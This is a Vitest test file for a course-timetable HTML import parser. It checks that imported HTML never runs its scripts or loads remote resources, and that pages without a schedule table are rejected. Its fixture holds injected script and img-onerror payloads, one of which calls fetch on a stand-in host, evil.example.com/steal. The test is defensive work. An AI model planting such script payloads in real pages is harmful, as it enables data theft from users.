// @vitest-environment jsdom
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, resolve } from "node:path";

import { afterEach, describe, expect, it, vi } from "vitest";

import { extractHtmlTable, parseImportFile } from "../src/parse";
import type { TermCalendar } from "../src/types";

const repoRoot = resolve(dirname(fileURLToPath(import.meta.url)), "../../..");
const term = JSON.parse(
  readFileSync(resolve(repoRoot, "fixtures/term.demo.json"), "utf-8"),
) as TermCalendar;

describe("IMPORT-03 恶意 HTML 不执行、不联网", () => {
  afterEach(() => {
    vi.unstubAllGlobals();
    delete (globalThis as Record<string, unknown>).__maliciousExecuted;
  });

  it("脚本不执行、远程资源不加载，表格文本被安全提取", () => {
    const fetchSpy = vi.fn();
    vi.stubGlobal("fetch", fetchSpy);

    const malicious = `<!DOCTYPE html><html><body>
      <script>globalThis.__maliciousExecuted = true; fetch("https://evil.example.com/steal");</script>
      <img src="https://evil.example.com/track.png" onerror="globalThis.__maliciousExecuted = true">
      <table>
        <tr><th>课程</th><th>星期</th><th>节次</th><th>周次</th></tr>
        <tr><td>高等数学（虚构）<script>globalThis.__maliciousExecuted = true;</script></td><td>周一</td><td>1-2</td><td>1-4</td></tr>
      </table>
    </body></html>`;

    const result = parseImportFile({ name: "page.html", content: malicious }, "html", term, {
      datasetKind: "demo",
      capturedAt: "2026-09-19T12:00:00+08:00",
    });

    expect((globalThis as Record<string, unknown>).__maliciousExecuted).toBeUndefined();
    expect(fetchSpy).not.toHaveBeenCalled();
    expect(result.payload).not.toBeNull();
    expect(result.payload!.courses[0].title).toContain("高等数学（虚构）");
    // 脚本内容只作为惰性文本的一部分，不会成为可执行内容
    expect(result.payload!.courses[0].title).not.toContain("<script>");
  });

  it("HTML 中没有课表表格时拒绝导入（IMPORT-01 降级）", () => {
    const html = `<html><body><form><input type="password"></form></body></html>`;
    expect(extractHtmlTable(html)).toBeNull();
    const result = parseImportFile({ name: "login.html", content: html }, "html", term);
    expect(result.payload).toBeNull();
    expect(result.issues.some((issue) => issue.code === "UNSUPPORTED_PAGE")).toBe(true);
  });
});
